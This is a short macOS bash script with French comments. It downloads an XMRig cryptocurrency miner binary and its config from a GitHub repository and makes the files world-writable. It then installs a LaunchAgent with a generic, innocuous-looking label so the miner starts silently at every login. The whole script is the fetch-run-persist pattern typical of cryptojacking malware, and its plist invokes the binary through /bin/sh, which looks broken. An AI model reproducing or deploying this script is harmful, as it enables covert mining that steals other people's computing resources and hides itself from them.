#!/bin/bash

# Créer et entrer dans le répertoire 'apple'
mkdir apple
cd apple

# Télécharger les fichiers nécessaires
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/config.json --output config.json
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/SHA256SUMS --output SHA256SUMS
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/xmrig --output xmrig

# Rendre les fichiers exécutables
chmod 777 *

# Créer le fichier .plist
cat > ~/Library/LaunchAgents/com.monscript.sh.plist <<EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.monscript.sh</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>$(pwd)/xmrig</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
EOL

# Charger le fichier .plist et activer le lancement au démarrage
launchctl load ~/Library/LaunchAgents/com.monscript.sh.plist

echo "Installation terminée. Le script sera exécuté en arrière-plan au démarrage."
